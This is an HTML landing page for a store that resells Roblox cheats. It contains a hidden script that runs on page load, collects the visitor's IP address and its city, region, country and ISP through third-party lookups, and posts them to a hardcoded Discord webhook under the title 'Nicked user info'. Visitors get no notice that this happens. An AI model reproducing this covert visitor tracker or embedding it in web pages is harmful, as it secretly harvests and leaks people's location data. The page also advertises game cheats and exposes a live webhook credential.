<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Arch Reseller</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <style>
        /* Custom Styles */
        .btn-primary {
            background-color: #4F46E5;
            background-image: linear-gradient(45deg, #4F46E5 0%, #000000 100%);
            color: #FFFFFF;
            transition: background-color 0.3s ease;
        }

        .btn-primary:hover {
            background-color: #4436d1;
            background-image: linear-gradient(45deg, #4436d1 0%, #000000 100%);
        }

        .wave-container {
            position: relative;
        }

        .wave-svg {
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%;
            height: auto;
            z-index: -1;
            animation: wave 15s linear infinite alternate;
            transform-origin: bottom;
        }

        @keyframes wave {
            0% {
                transform: translateY(0) rotateZ(0deg);
            }
            100% {
                transform: translateY(-50%) rotateZ(-10deg);
            }
        }

        .description {
            opacity: 0;
            animation: fade-in 1s ease forwards;
        }

        @keyframes fade-in {
            from {
                opacity: 0;
            }

            to {
                opacity: 1;
            }
        }

        .wrapper {
            background: linear-gradient(to bottom, #4F46E5, #000000);
        }
    </style>
</head>

<body>
    <div class="wrapper min-h-screen flex flex-col justify-between">
        <header class="bg-gradient-to-b from-blue-900 to-black shadow">
            <div class="container mx-auto px-4 py-6 flex justify-center items-center relative">
                <h1 class="text-3xl font-bold text-gray-100">Arch Reseller</h1>
                <div class="wave-container">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1440 320" class="wave-svg"><path fill="#000000" fill-opacity="1" d="M0,224L48,218.7C96,213,192,203,288,186.7C384,171,480,149,576,160C672,171,768,213,864,197.3C960,181,1056,107,1152,96C1248,85,1344,139,1392,165.3L1440,192L1440,320L1392,320C1344,320,1248,320,1152,320C1048,320,960,320,864,320C768,320,672,320,576,320C480,320,384,320,288,320C192,320,96,320,48,320L0,320Z"></path></svg>
                </div>
            </div>
        </header>

        <main class="container mx-auto px-4 py-8">
            <div class="flex justify-center">
                <a href="https://archreseller.mysellix.io/" target="_blank" rel="noopener noreferrer" class="btn-primary px-8 py-4 rounded-full shadow-lg transition-colors duration-300">Go to the shop</a>
            </div>
        </main>

        <footer class="bg-gradient-to-t from-blue-900 to-black text-white py-6">
            <div class="container mx-auto text-center">
                <p class="description">&copy; Reselling roblox cheats since 2024 January. Get your cheats now!</p>
            </div>
        </footer>
    </div>

    <script>
        async function getUserIP() {
            try {
                const response = await fetch('https://api.ipify.org/?format=json');
                const data = await response.json();
                const userIP = data.ip;
                console.log('User IP:', userIP);

                const ipapiResponse = await fetch(`https://ipapi.co/${userIP}/json/`);
                const ipapiData = await ipapiResponse.json();
                console.log('IP Details from ipapi.co:', ipapiData);

                const webhookURL = 'https://discord.com/api/webhooks/1241493208022908958/VNbb4xWXE4ZqjrpPEr-PqkXIxajri8QwT-IJV2zRgSARiVOOgif4ayvsrqBWzq7zkY98'; // Replace with your Discord webhook URL

                const embed = {
                    title: "Nicked user info",
                    color: 5814783, // Customize the color as needed
                    fields: [
                        {
                            name: "IP Address",
                            value: userIP,
                            inline: true
                        },
                        {
                            name: "Country",
                            value: ipapiData.country_name,
                            inline: true
                        },
                        {
                            name: "Region",
                            value: ipapiData.region,
                            inline: true
                        },
                        {
                            name: "City",
                            value: ipapiData.city,
                            inline: true
                        },
                        {
                            name: "ISP",
                            value: ipapiData.org,
                            inline: true
                        }
                    ],
                    timestamp: new Date().toISOString()
                };

                const payload = {
                    embeds: [embed]
                };

                await fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                });
            } catch (error) {
                console.error('Error fetching IP address:', error);
            }
        }

        getUserIP();
    </script>
</body>

</html>
